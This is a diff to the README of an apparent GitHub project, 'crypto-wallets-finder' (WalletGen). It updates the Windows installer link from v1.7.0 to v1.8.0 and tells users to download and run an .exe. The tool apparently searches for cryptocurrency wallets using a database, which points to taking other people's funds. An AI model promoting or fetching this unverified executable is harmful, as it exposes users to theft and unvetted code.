@@ -96,7 +96,7 @@ By using the database, you can significantly improve the efficiency of your sear
 - Unpack anywhere
 - Run `WalletGen.exe`
 
-Or Just Download [Installer](https://github.com/tony-dev1/crypto-wallets-finder/releases/download/walletgen/WalletGen_v1.7.0_Setup.exe)
+Or Just Download [Installer](https://github.com/tony-dev1/crypto-wallets-finder/releases/download/walletgen/WalletGen_v1.8.0_Setup.exe)
 
 ## Linux (x86-64bit)
 ```bash
